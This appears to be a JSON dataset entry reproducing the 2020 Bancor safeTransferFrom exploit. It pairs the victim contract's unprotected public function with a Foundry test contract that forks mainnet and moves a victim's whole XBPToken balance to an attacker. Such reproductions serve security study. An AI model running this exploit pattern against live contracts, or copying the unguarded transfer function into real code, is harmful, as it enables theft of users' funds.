[
  {
    "contract/interface": "IBancor",
    "source_type": "victim_contract",
    "function_name": "safeTransferFrom",
    "original_code": "    function safeTransferFrom(IERC20Token _token, address _from, address _to, uint256 _value) public {\n       execute(_token, abi.encodeWithSelector(TRANSFER_FROM_FUNC_SELECTOR, _from, _to, _value));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 10_307_563); // fork mainnet at 10307563\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BancorExploit",
    "source_type": "attacker_contract",
    "function_name": "testsafeTransfer",
    "original_code": "    function testsafeTransfer() public {\n        emit log_named_uint(\n            \"Victim XBPToken Allowance to Bancor Contract : \", (XBPToken.allowance(victim, bancorAddress) / 1 ether)\n        );\n        emit log_named_uint(\"[Before Attack]Victim XBPToken Balance : \", (XBPToken.balanceOf(victim)) / 1 ether);\n        emit log_named_uint(\"[Before Attack]Attacker XBPToken Balance : \", (XBPToken.balanceOf(attacker)) / 1 ether);\n\n        cheats.prank(address(this));\n        bancorContract.safeTransferFrom(\n            IERC20(address(XBPToken)),\n            victim,\n            attacker,\n            XBPToken.balanceOf(victim) //905987977635678910008152\n        );\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_uint(\"[After Attack]Victim XBPToken Balance : \", (XBPToken.balanceOf(victim)) / 1 ether);\n        emit log_named_uint(\"[After Attack]Attacker XBPToken Balance : \", (XBPToken.balanceOf(attacker)) / 1 ether);\n    }\n",
    "description": ""
  }
]